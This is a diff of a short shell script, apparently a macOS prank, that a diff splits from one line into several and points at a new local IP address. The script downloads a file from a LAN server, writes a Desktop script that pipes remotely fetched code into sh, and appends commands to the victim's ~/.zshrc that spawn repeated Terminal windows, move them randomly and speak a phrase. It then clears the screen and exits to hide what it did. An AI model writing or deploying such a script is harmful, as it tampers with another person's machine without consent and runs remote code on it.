@@ -1,1 +1,15 @@
-cd ~ ; rm author .author disable ; curl http://10.18.206.165:5500/author > .author ; echo "#!/bin/sh" > ~/Desktop/disable ; echo "curl http://10.18.206.165:5500/disable | sh" >> ~/Desktop/disable ; chmod 777 ~/Desktop/disable ; cp .zshrc .zshrccpy ; echo "cat ~/.author" >> ~/.zshrc ; echo "printf '\e[8;49;100t'" >> ~/.zshrc ; echo "sleep 1" >> ~/.zshrc ; echo "open /System/Applications/Utilities/Terminal.app -n" >> ~/.zshrc ; echo "printf '\e[3;'$(( $RANDOM % 980 + 1 ))';'$(( $RANDOM % 200 + 1 ))'t'" >> ~/.zshrc ; echo "say hello bebou" >> .zshrc ; clear ; exit ;
+cd ~ ; rm author .author disable ;
+curl http://192.168.0.31:5500/author > .author ;
+echo "#!/bin/sh" > ~/Desktop/disable ;
+echo "curl http://192.168.0.31:5500/disable | sh" >> ~/Desktop/disable ;
+chmod 777 ~/Desktop/disable ;
+cp .zshrc .zshrccpy ;
+echo "cat ~/.author" >> ~/.zshrc ;
+echo "say hello bebou" >> .zshrc ;
+echo "printf '\e[8;49;100t'" >> ~/.zshrc ;
+echo "sleep 1" >> ~/.zshrc ;
+echo "open /System/Applications/Utilities/Terminal.app -n" >> ~/.zshrc ;
+echo "open /System/Applications/Utilities/Terminal.app -n" >> ~/.zshrc ;
+echo "printf '\e[3;'\$(( \$RANDOM % 980 + 1 ))';'\$(( \$RANDOM % 200 + 1 ))'t'" >> ~/.zshrc ;
+clear ;
+exit
